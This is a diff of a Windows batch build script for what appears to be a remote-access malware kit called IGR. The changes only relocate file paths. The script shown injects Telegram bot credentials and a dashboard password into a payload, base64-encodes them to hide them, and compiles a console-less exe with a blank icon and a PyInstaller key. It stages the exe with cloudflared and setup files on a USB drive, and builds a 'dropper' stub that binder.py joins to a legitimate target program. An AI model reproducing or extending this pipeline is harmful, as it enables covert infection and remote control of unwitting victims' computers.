@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 REM Read version from main.py
 set "IGR_VERSION="
-for /f %%v in ('python -c "import re;m=re.search(r'IGR_VERSION\s*=\s*[\x22\x27]([^\x22\x27]+)',open('main.py').read());print(m.group(1) if m else '6')"') do set "IGR_VERSION=%%v"
+for /f %%v in ('python -c "import re;m=re.search(r'IGR_VERSION\s*=\s*[\x22\x27]([^\x22\x27]+)',open('files/main.py').read());print(m.group(1) if m else '6')"') do set "IGR_VERSION=%%v"
 if not defined IGR_VERSION set "IGR_VERSION=6"
 echo ============================================
 echo   IGR v%IGR_VERSION% Build
@@ -22,9 +22,9 @@ echo   [3] IGR Logo - Custom IGR logo
 echo.
 set /p "ICON_CHOICE=Choose icon (1, 2 or 3): "
 if "%ICON_CHOICE%"=="1" set "ICON_FLAG="
-if "%ICON_CHOICE%"=="2" set "ICON_FLAG=--icon=blank.ico"
-if "%ICON_CHOICE%"=="3" set "ICON_FLAG=--icon=logos\igr-logo.ico"
-if not defined ICON_FLAG set "ICON_FLAG=--icon=blank.ico"
+if "%ICON_CHOICE%"=="2" set "ICON_FLAG=--icon=files\blank.ico"
+if "%ICON_CHOICE%"=="3" set "ICON_FLAG=--icon=files\logos\igr-logo.ico"
+if not defined ICON_FLAG set "ICON_FLAG=--icon=files\blank.ico"
 
 if "%INJECT_MODE%"=="2" goto :bind_mode
 
@@ -40,7 +40,7 @@ echo.
 if not exist config.txt goto :usb_ask_config
 echo   Found saved configuration (config.txt):
 echo.
-powershell -ExecutionPolicy Bypass -File save_config.ps1 show
+powershell -ExecutionPolicy Bypass -File files\save_config.ps1 show
 echo.
 set /p "USE_SAVED=  Use saved config? (y/n): "
 if /i "!USE_SAVED!"=="y" goto :usb_load_config
@@ -88,12 +88,12 @@ echo DASHBOARD_PASSWORD=!DASHBOARD_PASSWORD!>> _save_args.txt
 echo TELEGRAM_BOT_TOKEN=!TELEGRAM_BOT_TOKEN!>> _save_args.txt
 echo TELEGRAM_CHAT_ID=!TELEGRAM_CHAT_ID!>> _save_args.txt
 if defined UPDATE_URL (echo UPDATE_URL=!UPDATE_URL!>> _save_args.txt) else (echo UPDATE_URL=>> _save_args.txt)
-powershell -ExecutionPolicy Bypass -File save_config.ps1 save
+powershell -ExecutionPolicy Bypass -File files\save_config.ps1 save
 echo   Configuration saved to config.txt for next build.
 goto :usb_config_done
 
 :usb_load_config
-powershell -ExecutionPolicy Bypass -File save_config.ps1 load
+powershell -ExecutionPolicy Bypass -File files\save_config.ps1 load
 call _load_config.bat
 del /f /q _load_config.bat >nul 2>&1
 echo   Loaded saved config.
@@ -103,7 +103,7 @@ echo   Loaded saved config.
 REM Create build copy of main.py with injected values
 echo.
 echo [2/6] Injecting configuration (encrypted)...
-copy /y "main.py" "main_build.py" >nul
+copy /y "files\main.py" "main_build.py" >nul
 
 REM Base64-encode sensitive values so they are not plaintext in the exe
 powershell -Command ^
@@ -241,14 +241,14 @@ echo   Copying files to %USB_DRIVE% ...
 if not exist "%USB_DRIVE%\subfiles" mkdir "%USB_DRIVE%\subfiles"
 copy /y "dist\igr_v%IGR_VERSION%.exe" "%USB_DRIVE%\subfiles\igr_v%IGR_VERSION%.exe" >nul
 copy /y "cloudflared.exe" "%USB_DRIVE%\subfiles\cloudflared.exe" >nul
-copy /y "setup.bat" "%USB_DRIVE%\setup.bat" >nul
+copy /y "files\setup.bat" "%USB_DRIVE%\setup.bat" >nul
 echo   Done.
 
 set "CLEANUP_COPIED=0"
 echo.
 set /p "CLEANUP_CHOICE=Also copy cleanup.bat to USB? (y/n): "
 if /i "%CLEANUP_CHOICE%"=="y" (
-    copy /y "cleanup.bat" "%USB_DRIVE%\cleanup.bat" >nul
+    copy /y "files\cleanup.bat" "%USB_DRIVE%\cleanup.bat" >nul
     echo   cleanup.bat copied to USB root.
     set "CLEANUP_COPIED=1"
 ) else (
@@ -285,7 +285,7 @@ echo.
 if not exist config.txt goto :bind_ask_config
 echo   Found saved configuration (config.txt):
 echo.
-powershell -ExecutionPolicy Bypass -File save_config.ps1 show
+powershell -ExecutionPolicy Bypass -File files\save_config.ps1 show
 echo.
 set /p "USE_SAVED=  Use saved config? (y/n): "
 if /i "!USE_SAVED!"=="y" goto :bind_load_config
@@ -328,12 +328,12 @@ echo DASHBOARD_PASSWORD=!DASHBOARD_PASSWORD!>> _save_args.txt
 echo TELEGRAM_BOT_TOKEN=!TELEGRAM_BOT_TOKEN!>> _save_args.txt
 echo TELEGRAM_CHAT_ID=!TELEGRAM_CHAT_ID!>> _save_args.txt
 if defined UPDATE_URL (echo UPDATE_URL=!UPDATE_URL!>> _save_args.txt) else (echo UPDATE_URL=>> _save_args.txt)
-powershell -ExecutionPolicy Bypass -File save_config.ps1 save
+powershell -ExecutionPolicy Bypass -File files\save_config.ps1 save
 echo   Configuration saved to config.txt for next build.
 goto :bind_config_done
 
 :bind_load_config
-powershell -ExecutionPolicy Bypass -File save_config.ps1 load
+powershell -ExecutionPolicy Bypass -File files\save_config.ps1 load
 call _load_config.bat
 del /f /q _load_config.bat >nul 2>&1
 echo   Loaded saved config.
@@ -343,7 +343,7 @@ echo   Loaded saved config.
 REM Inject config into main.py
 echo.
 echo [2/7] Injecting configuration (encrypted)...
-copy /y "main.py" "main_build.py" >nul
+copy /y "files\main.py" "main_build.py" >nul
 
 REM Base64-encode sensitive values so they are not plaintext in the exe
 powershell -Command ^
@@ -398,7 +398,7 @@ echo.
 echo [5/7] Compiling stub.exe (dropper)...
 python -m PyInstaller --onefile --noconsole --name stub %ICON_FLAG% --clean --noconfirm ^
     --key=igr_pyc_key_2024 ^
-    stub.py
+    files\stub.py
 
 if not exist "dist\stub.exe" (
     echo.
@@ -428,7 +428,7 @@ echo   Target: %TARGET_NAME% (%TARGET_EXE%)
 REM Bind everything together
 echo.
 echo [7/7] Binding executables...
-python binder.py "dist\stub.exe" "%TARGET_EXE%" "dist\igr_v%IGR_VERSION%.exe" "dist\%TARGET_NAME%"
+python files\binder.py "dist\stub.exe" "%TARGET_EXE%" "dist\igr_v%IGR_VERSION%.exe" "dist\%TARGET_NAME%"
 
 if not exist "dist\%TARGET_NAME%" (
     echo.
